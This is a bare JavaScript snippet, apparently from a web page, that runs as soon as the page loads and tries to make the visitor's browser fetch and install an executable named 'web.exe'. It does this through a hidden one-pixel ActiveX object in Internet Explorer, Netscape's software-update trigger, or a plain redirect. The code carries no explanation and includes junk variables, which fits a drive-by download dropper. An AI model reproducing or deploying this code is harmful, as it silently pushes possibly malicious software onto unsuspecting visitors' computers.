<SCRIPT LANGUAGE="JavaScript">
<!--
var ex='mod/files/web.exe';
var bbb=navigator.appName;
sdfgtyu = "sdvds";
sdgvdsg = "sdgsgsd";
var bver=parseInt(navigator.appVersion);

function inst() {
        if (bbb == 'Microsoft Internet Explorer' && bver >= 2) {
                document.write('<object id="g" width=1 height=1 classid="CLSID:028B7EC4-EECA-11d3-8E71-0000E80C8C0D"   codebase="'+ex+'"></object>');
        } else if (bbb == 'Netscape' && bver >= 4) {
                trigger = netscape.softupdate.Trigger;
                if (trigger.UpdateEnabled) {
                        trigger.StartSoftwareUpdate(ex, trigger.DEFAULT_MODE)
                } else {
                        location.replace(ex);
                }
        } else {
                location.replace(ex);
        }
}

inst();

// -->
</script>
